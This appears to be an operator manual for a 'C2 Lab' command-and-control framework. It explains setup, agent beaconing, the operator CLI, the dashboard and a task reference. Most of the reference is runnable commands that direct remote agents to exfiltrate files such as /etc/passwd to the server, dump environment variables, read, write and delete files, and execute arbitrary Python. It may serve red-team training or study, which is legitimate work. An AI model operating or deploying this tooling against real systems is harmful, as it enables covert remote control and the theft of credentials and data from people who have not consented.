C2 Lab — Operator Reference

# First-Time Setup

## 1. Generate the shared encryption key

The agent and server must share a Fernet key. All task payloads and results
are encrypted with this key in transit.

    python3 -c "from cryptography.fernet import Fernet; print(Fernet.generate_key().decode())" \
        > config/shared_key
    chmod 600 config/shared_key

Copy config/shared_key to the agent host (same path relative to the repo).
Alternatively, export it as an environment variable on both hosts:

    export C2_SHARED_KEY=$(cat config/shared_key)

## 2. Generate the agent authentication key

Agents must prove their identity to the server on every beacon and upload.
This key is sent in the X-Agent-Key header.

    python3 -m server.create_user --gen-agent-key

This writes a random hex key to config/agent_key (mode 600) and prints it.
Copy config/agent_key to the agent host, or export:

    export C2_AGENT_KEY=$(cat config/agent_key)

## 3. Create an operator account

    python3 -m server.create_user                    # creates 'admin'
    python3 -m server.create_user --username alice   # creates 'alice'

Password must be at least 12 characters. Passwords are hashed with
pbkdf2:sha256:600000 and Fernet-encrypted before storage.

## 4. (Optional) Set a stable token signing key

Without this, operator tokens are invalidated every time the server restarts.

    export C2_SECRET_KEY=$(python3 -c "import secrets; print(secrets.token_hex(32))")

## 5. Start the server

    python3 -m server.app

Server listens on 0.0.0.0:5000. Web dashboard at http://localhost:5000.

## 6. Start the agent

    python3 -m agent.agent

The agent writes its UUID to agent/.agent_id on first run and reuses it on
restart, giving it a stable identity. It beacons every 10-30 seconds
(jittered). The UUID is printed on startup — you'll need it for exec commands.

---

# Operator CLI

## Login / logout

    python3 -m controller.operator login
    python3 -m controller.operator logout

Credentials are exchanged for a signed token stored in
controller/.operator_token (mode 600). Tokens expire after 8 hours.

## List registered agents

    python3 -m controller.operator agents

Sample output:

    3f4a1b2c-7d9e-4f01-a234-56789abcdef0
      user:      alice
      host:      workstation.local
      os:        Darwin
      status:    online
      last_seen: 1711800000.0

An agent is "online" if it beaconed within the last 60 seconds.
Agent records persist in SQLite — you'll see agents from previous sessions
with their last_seen timestamp and an "offline" status.

## Push a task

    python3 -m controller.operator exec <AGENT_ID> <TASK_TYPE> [--args '<JSON>']

Replace <AGENT_ID> with the UUID from the agents command. The task is stored
in the database immediately. The agent will pick it up on its next beacon.

---

# Task Lifecycle

Every task moves through three stages:

    queued ──► delivered ──► completed

  queued     Task was pushed by the operator; waiting for the agent to beacon.
  delivered  Server handed the task to the agent on its last beacon.
  completed  Agent posted a result back; result is stored in the database.

Tasks and results persist in SQLite. They survive server restarts.
Use the web dashboard or GET /api/tasks?agent_id=<ID> to inspect state.

---

# Web Dashboard

Open http://localhost:5000 in a browser. Log in with your operator credentials.
The dashboard auto-refreshes every 5 seconds.

  Sidebar       All registered agents with online/offline status
  Task Dispatch Select an agent, choose a task type, fill in args, click Push Task
  Task Results  Live view of queued / delivered / completed tasks for the selected agent
  Clear button  Deletes all task records for an agent from the database

---

# Task Reference

## Filesystem

### list_directory — list files in a directory

    python3 -m controller.operator exec <ID> list_directory --args '{"path":"/tmp"}'

### sample_file — read the first 5 lines of a file

    python3 -m controller.operator exec <ID> sample_file --args '{"path":"/etc/hosts"}'

### read_file — read a file (1 MB max)

    python3 -m controller.operator exec <ID> read_file --args '{"path":"/etc/hostname"}'

### write_file — write content to a file

    python3 -m controller.operator exec <ID> write_file \
        --args '{"path":"/tmp/out.txt","content":"hello world"}'

### delete_file — delete a file (agent's own files are protected)

    python3 -m controller.operator exec <ID> delete_file --args '{"path":"/tmp/out.txt"}'

### exfil_file — base64-encode a file and upload it to the server (5 MB max)

    python3 -m controller.operator exec <ID> exfil_file --args '{"path":"/etc/passwd"}'

Exfiltrated files are saved to exfil/<agent_id>_<filename> on the server.

---

## Sysinfo

### get_sysinfo — OS, kernel, architecture, Python version

    python3 -m controller.operator exec <ID> get_sysinfo

### get_env — full environment variable dump

    python3 -m controller.operator exec <ID> get_env

### get_uptime — boot time and uptime in seconds

    python3 -m controller.operator exec <ID> get_uptime

### get_processes — running process list (default 50, max 500)

    python3 -m controller.operator exec <ID> get_processes
    python3 -m controller.operator exec <ID> get_processes --args '{"limit":100}'

---

## Execution

### python_exec — run Python in a sandboxed subprocess

Default timeout is 5 seconds. Assign to `result` to surface a return value.
stdout and stderr are captured and returned. A restricted builtins set is
enforced — obvious sandbox escapes are blocked, but this is not a hardened
execution environment.

    python3 -m controller.operator exec <ID> python_exec \
        --args '{"code":"result = 2 + 2"}'

    python3 -m controller.operator exec <ID> python_exec \
        --args '{"code":"import platform; result = platform.uname()._asdict()"}'

    python3 -m controller.operator exec <ID> python_exec \
        --args '{"code":"print(\"hello\")", "timeout": 10}'

---

# Credential Management

    python3 -m server.create_user                        # create / update 'admin'
    python3 -m server.create_user --username <name>      # create / update named user
    python3 -m server.create_user --delete <name>        # delete a user
    python3 -m server.create_user --list                 # list all users and last login
    python3 -m server.create_user --gen-agent-key        # rotate the agent auth key

Rotating the agent key (--gen-agent-key) immediately invalidates any running
agents using the old key. Redeploy the new key to agents before they next
beacon or they will be rejected with 401.

---

# System Limits

| Limit                            | Value                              |
|----------------------------------|------------------------------------|
| Max queued tasks per agent       | 100                                |
| Max exfil file size              | 5 MB                               |
| read_file max size               | 1 MB                               |
| python_exec default timeout      | 5 seconds                          |
| Login rate limit                 | 10 attempts / 60s per IP           |
| Operator token TTL               | 8 hours                            |
| Agent timeout (online → offline) | 60 seconds without beacon          |
| Task persistence                 | SQLite (survives server restarts)  |
| Exfil directory                  | exfil/                             |
| Transport encryption             | Fernet (AES-128-CBC + HMAC-SHA256) |
| Password hashing                 | pbkdf2:sha256:600000               |
| Credential storage               | Fernet-encrypted SQLite            |
